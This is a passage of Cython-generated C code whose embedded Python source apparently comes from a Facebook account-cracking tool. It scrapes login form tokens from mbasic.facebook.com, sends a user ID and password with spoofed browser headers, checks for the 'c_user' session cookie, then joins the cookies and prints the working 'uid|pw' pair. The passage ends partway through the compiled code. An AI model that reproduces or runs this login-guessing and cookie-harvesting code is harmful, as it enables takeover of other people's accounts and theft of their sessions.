    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":1049
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text             # <<<<<<<<<<<<<<
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1049, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_refid_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1049, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1049, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1049, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_p, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":1050
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")             # <<<<<<<<<<<<<<
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_parser); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1050, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_8 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_3)) {
      PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_p, __pyx_kp_s_html_parser};
      __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1050, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_GOTREF(__pyx_t_7);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
      PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_v_p, __pyx_kp_s_html_parser};
      __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1050, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_GOTREF(__pyx_t_7);
    } else
    #endif
    {
      __pyx_t_4 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1050, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (__pyx_t_8) {
        __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_8); __pyx_t_8 = NULL;
      }
      __Pyx_INCREF(__pyx_v_p);
      __Pyx_GIVEREF(__pyx_v_p);
      PyTuple_SET_ITEM(__pyx_t_4, 0+__pyx_t_10, __pyx_v_p);
      __Pyx_INCREF(__pyx_kp_s_html_parser);
      __Pyx_GIVEREF(__pyx_kp_s_html_parser);
      PyTuple_SET_ITEM(__pyx_t_4, 1+__pyx_t_10, __pyx_kp_s_html_parser);
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_4, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1050, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_b, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":1051
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]             # <<<<<<<<<<<<<<
 * 			for i in b("input"):
 * 				try:
 */
    __pyx_t_7 = PyList_New(7); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1051, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_INCREF(__pyx_n_s_lsd);
    __Pyx_GIVEREF(__pyx_n_s_lsd);
    PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_lsd);
    __Pyx_INCREF(__pyx_n_s_jazoest);
    __Pyx_GIVEREF(__pyx_n_s_jazoest);
    PyList_SET_ITEM(__pyx_t_7, 1, __pyx_n_s_jazoest);
    __Pyx_INCREF(__pyx_n_s_m_ts);
    __Pyx_GIVEREF(__pyx_n_s_m_ts);
    PyList_SET_ITEM(__pyx_t_7, 2, __pyx_n_s_m_ts);
    __Pyx_INCREF(__pyx_n_s_li);
    __Pyx_GIVEREF(__pyx_n_s_li);
    PyList_SET_ITEM(__pyx_t_7, 3, __pyx_n_s_li);
    __Pyx_INCREF(__pyx_n_s_try_number);
    __Pyx_GIVEREF(__pyx_n_s_try_number);
    PyList_SET_ITEM(__pyx_t_7, 4, __pyx_n_s_try_number);
    __Pyx_INCREF(__pyx_n_s_unrecognized_tries);
    __Pyx_GIVEREF(__pyx_n_s_unrecognized_tries);
    PyList_SET_ITEM(__pyx_t_7, 5, __pyx_n_s_unrecognized_tries);
    __Pyx_INCREF(__pyx_n_s_login_2);
    __Pyx_GIVEREF(__pyx_n_s_login_2);
    PyList_SET_ITEM(__pyx_t_7, 6, __pyx_n_s_login_2);
    __Pyx_XDECREF_SET(__pyx_v_bl, ((PyObject*)__pyx_t_7));
    __pyx_t_7 = 0;

    /* "libme.pyx":1052
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):             # <<<<<<<<<<<<<<
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 */
    __Pyx_INCREF(__pyx_v_b);
    __pyx_t_3 = __pyx_v_b; __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_n_s_input) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_input);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1052, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (likely(PyList_CheckExact(__pyx_t_7)) || PyTuple_CheckExact(__pyx_t_7)) {
      __pyx_t_3 = __pyx_t_7; __Pyx_INCREF(__pyx_t_3); __pyx_t_12 = 0;
      __pyx_t_13 = NULL;
    } else {
      __pyx_t_12 = -1; __pyx_t_3 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1052, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_13 = Py_TYPE(__pyx_t_3)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 1052, __pyx_L1_error)
    }
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    for (;;) {
      if (likely(!__pyx_t_13)) {
        if (likely(PyList_CheckExact(__pyx_t_3))) {
          if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_7 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 1052, __pyx_L1_error)
          #else
          __pyx_t_7 = PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1052, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
        } else {
          if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_3)) break;
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_7 = PyTuple_GET_ITEM(__pyx_t_3, __pyx_t_12); __Pyx_INCREF(__pyx_t_7); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 1052, __pyx_L1_error)
          #else
          __pyx_t_7 = PySequence_ITEM(__pyx_t_3, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1052, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_7);
          #endif
        }
      } else {
        __pyx_t_7 = __pyx_t_13(__pyx_t_3);
        if (unlikely(!__pyx_t_7)) {
          PyObject* exc_type = PyErr_Occurred();
          if (exc_type) {
            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
            else __PYX_ERR(0, 1052, __pyx_L1_error)
          }
          break;
        }
        __Pyx_GOTREF(__pyx_t_7);
      }
      __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_7);
      __pyx_t_7 = 0;

      /* "libme.pyx":1053
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_16);
        /*try:*/ {

          /* "libme.pyx":1054
 * 			for i in b("input"):
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})             # <<<<<<<<<<<<<<
 * 					else:continue
 * 				except:pass
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1054, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_8)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_8);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_8, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_n_s_name);
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1054, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_t_7, __pyx_v_bl, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 1054, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_18 = (__pyx_t_17 != 0);
          if (__pyx_t_18) {
            __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_6 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_6, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_n_s_name);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
              }
            }
            __pyx_t_8 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_n_s_value) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_n_s_value);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (PyDict_SetItem(__pyx_t_7, __pyx_t_4, __pyx_t_8) < 0) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1054, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            goto __pyx_L15;
          }

          /* "libme.pyx":1055
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue             # <<<<<<<<<<<<<<
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 */
          /*else*/ {
            goto __pyx_L13_try_continue;
          }
          __pyx_L15:;

          /* "libme.pyx":1053
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
        }
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        goto __pyx_L14_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

        /* "libme.pyx":1056
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 * 				except:pass             # <<<<<<<<<<<<<<
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 */
        /*except:*/ {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L8_exception_handled;
        }
        __pyx_L13_try_continue:;

        /* "libme.pyx":1053
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):
 * 				try:             # <<<<<<<<<<<<<<
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 * 					else:continue
 */
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        goto __pyx_L5_continue;
        __pyx_L8_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_16);
        __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
        __pyx_L14_try_end:;
      }

      /* "libme.pyx":1052
 * 			b = parser(p,"html.parser")
 * 			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
 * 			for i in b("input"):             # <<<<<<<<<<<<<<
 * 				try:
 * 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 */
      __pyx_L5_continue:;
    }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "libme.pyx":1057
 * 					else:continue
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})             # <<<<<<<<<<<<<<
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1057, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_contact_point, __pyx_kp_s_) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_source, __pyx_kp_s_) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_prefill_type, __pyx_kp_s_) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_first_prefill_source, __pyx_kp_s_) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_first_prefill_type, __pyx_kp_s_) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_had_cp_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_had_password_prefilled, __pyx_n_s_false) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_is_smart_lock, __pyx_n_s_false) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_fb_noscript, __pyx_n_s_true) < 0) __PYX_ERR(0, 1057, __pyx_L1_error)
    __pyx_t_8 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_kwargs, __pyx_t_3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1057, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":1058
 * 				except:pass
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)             # <<<<<<<<<<<<<<
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1058, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_3 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_device_based_regular_logi); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1058, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = PyTuple_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1058, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_3);
    __pyx_t_3 = 0;
    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1058, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_data, __pyx_v_kwargs) < 0) __PYX_ERR(0, 1058, __pyx_L1_error)
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_7, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1058, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_gaaa, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":1059
 * 			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1059, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
